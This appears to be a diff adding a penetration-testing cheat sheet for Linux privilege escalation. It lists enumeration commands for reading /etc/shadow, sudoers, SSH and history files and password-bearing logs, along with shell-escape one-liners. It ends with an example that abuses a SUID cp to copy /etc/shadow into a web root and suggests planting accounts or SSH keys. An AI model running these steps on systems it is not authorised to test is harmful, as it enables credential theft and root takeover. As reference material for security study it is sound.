@@ -1,0 +1,143 @@
+Linux Enumeration for Escalation Root Access
+
+Command Result
+uname -a Print all available system information
+uname -r Kernel release
+uname -n System hostname
+hostname As above
+uname -m Linux kernel architecture (32 or 64 bit)
+cat /proc/version Kernel information
+cat /etc/*-release Distribution information
+cat /etc/issue As above
+cat /proc/cpuinfo CPU information
+df -a File system information
+
+Users & Groups:
+
+Command Result
+cat /etc/passwd List all users on the system
+cat /etc/group List all groups on the system
+cat /etc/shadow Show user hashes – Privileged command
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' List all super user accounts
+finger Users currently logged in
+pinky As above
+users As above
+who -a As above
+w Who is currently logged in and what they’re doing
+last Listing of last logged on users
+lastlog Information on when all users last logged in
+lastlog –u %username% Information on when the specified user last logged in
+
+User & Privilege Information:
+
+Command Result
+whoami Current username
+id Current user information
+cat /etc/sudoers Who’s allowed to do what as root – Privileged command
+sudo -l Can the current user perform anything as root
+
+Environmental Information:
+
+Command Result
+env Display environmental variables
+set As above
+echo $PATH Path information
+history Displays command history of current user
+pwd Print working directory, i.e. ‘where am I’
+cat /etc/profile Display default system variables
+
+Interesting Files:
+
+Command Result
+find / -perm -4000 -type f 2>/dev/null Find SUID files
+find / -uid 0 -perm -4000 -type f 2>/dev/null Find SUID files owned by root
+find / -perm -2000 -type f 2>/dev/null Find files with GUID bit set
+find / -perm -2 -type f 2>/dev/null Find world-writable files
+find / -perm -2 -type d 2>/dev/null Find word-writable directories
+find /home –name .rhosts -print 2>/dev/null Find rhost config files
+ls -ahlR /root/ See if you can access other user directories to find interesting files – Privileged command
+cat ~/.bash_history Show the current users’ command history
+ls -la ~/._history Show the current users’ various history files
+ls -la ~/.ssh/ Check for interesting ssh files in the current users’ directory
+ls -la /usr/sbin/in.* Check Configuration of inetd services
+grep -l -i pass /var/log/*.log 2>/dev/null Check log files for keywords (‘pass’ in this example) and show positive matches
+find /var/log -type f -exec ls -la {} ; 2>/dev/null List files in specified directory (/var/log)
+find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null List .log files in specified directory (/var/log)
+find /etc/ -maxdepth 1 -name .conf -type f -exec ls -la {} ; 2>/dev/null List .conf files in /etc (recursive 1 level)
+ls -la /etc/.conf As above
+find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null Find .conf files (recursive 4 levels) and output line number where the word password is located
+lsof -i -n List open files (output will depend on account privileges)
+
+Service Information:
+
+Command Result
+ps aux | grep root View services running as root
+cat /etc/inetd.conf List services managed by inetd
+cat /etc/xinetd.conf As above for xinetd
+
+Jobs/Tasks:
+
+Command Result
+crontab -l -u %username% Display scheduled jobs for the specified user – Privileged command
+ls -la /etc/cron* Scheduled jobs overview (hourly, daily, monthly etc)
+ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null What can ‘others’ write in /etc/cron* directories
+top List of current tasks
+
+Networking, Routing & Communications:
+
+Command Result
+/sbin/ifconfig -a List all network interfaces
+cat /etc/network/interfaces As above
+arp -a Display ARP communications
+route Display route information
+cat /etc/resolv.conf Show configured DNS sever addresses
+netstat -antp List all TCP sockets and related PIDs (-p Privileged command)
+netstat -anup List all UDP sockets and related PIDs (-p Privileged command)
+iptables -L List rules – Privileged command
+cat /etc/services View port numbers/services mappings
+
+Programs Installed:
+
+Command Result
+dpkg -l Installed packages (Debian)
+rpm -qa Installed packages (Red Hat)
+sudo -V Sudo version – does an exploit exist?
+httpd -v Apache version
+apache2 -v As above
+apache2ctl (or apachectl) -M List loaded Apache modules
+mysql --version Installed MYSQL version details
+perl -v Installed Perl version details
+java -version Installed Java version details
+python --version Installed Python version details
+ruby -v Installed Ruby version details
+find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc) Locate ‘useful’ programs (netcat, wget etc)
+which %program_name% (i.e. nc, netcat, wget, nmap etc) As above
+
+Common Shell Escape Sequences:
+
+Command Program(s)
+:!bash vi, vim
+:set shell=/bin/bash:shell vi, vim
+!bash man, more, less
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; find
+awk 'BEGIN {system("/bin/bash")}' awk
+--interactive nmap
+perl -e 'exec "/bin/bash";' Perl 
+ 
+ 
+ == Privillege escalation in Linux ==
+## Finds files that have the sticky bit set. 
+find / -perm -u=s -type f 2>/dev/null
+  perm // permission 
+  -f   //regular file
+  u=s  // (sticky)
+  
+  Example:
+## We found cp (copy) in the above list and now we are abusing it:
+cp -f --no-preserve=all /etc/shadow /var/www/html/joomla/shadow.txt
+
+Few things to keep in mind:
+## (1) at the destination, the file owner will be root but the group will be that of the current user and 
+## (2) notice the use of "--no-preserve" this is needed to read out protected files.
+## A lot of ways we can abuse this, update the shadow file with a new account, modify sudoers, plant ssh key + modify sshd_config ## + reboot,or cron.hourly.
+
